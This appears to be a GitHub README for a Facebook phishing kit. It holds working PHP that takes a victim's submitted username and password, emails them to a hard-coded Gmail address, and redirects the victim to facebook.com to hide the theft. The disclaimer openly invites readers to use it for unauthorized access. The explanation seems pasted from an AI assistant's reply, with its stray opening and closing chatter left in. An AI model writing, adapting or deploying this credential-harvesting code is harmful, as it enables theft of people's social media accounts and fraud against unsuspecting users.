# Facebook-Phishing
This tool is developed for educational purposes. It only demonstrates how phishing works. If anybody wants to gain unauthorized access to someones social media, he/she may try out this at his/her own risk. You have your own responsibilities, use it with your own responsibility and you are liable to any damage or violation of laws by this tool. The author is not responsible for any misuse of facebook-phishing!
Certainly, here's an explanation you can include in your README on GitHub to help others understand the PHP code you provided:

---
## PHP Code Explanation

This PHP code snippet demonstrates how to process form submissions using the HTTP POST method and send an email with the collected form data. It's important to note that this example serves for educational purposes and should not be used in a production environment without proper security considerations.

```php
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Send email
    $to = "hanzmark03@gmail.com";
    $subject = "Login Details";
    $message = "Username: $username\nPassword: $password";
    $headers = "From: webmaster@example.com";

    if (mail($to, $subject, $message, $headers)) {
        // Email sent successfully, perform the redirection
        header("Location: https://facebook.com");
        exit(); // Make sure to exit to prevent further execution
    } else {
        echo "Failed to send email.";
    }
}
?>
```

### Explanation:

1. The code checks if the current server request method is "POST." This typically indicates that a form has been submitted.

2. If the request method is indeed "POST," the code extracts the values of the "username" and "password" fields from the submitted form data using the `$_POST` superglobal.

3. The code constructs an email containing the collected username and password information. It specifies the recipient's email address, email subject, message body, and a "From" header.

4. The `mail()` function is used to send the email. It takes the recipient's email address, subject, message, and headers as parameters. If the email is sent successfully, the code proceeds to the next steps. If the email fails to send, a "Failed to send email" message is echoed.

5. In the event that the email is sent successfully (determined by the `mail()` function), the code sets an HTTP header to redirect the user's browser to "https://facebook.com."

6. The `exit()` function is called to terminate the script execution immediately after setting the redirect header. This ensures that no further code is executed after the redirection.

**Important Note:** This code has security implications and should not be used to handle sensitive information without proper security measures. Email is not a secure method for transmitting sensitive data, and the redirection could be misused for malicious purposes. Always follow best practices for security when handling user data.

---

Feel free to modify and enhance this explanation as needed to better suit your project's context and audience.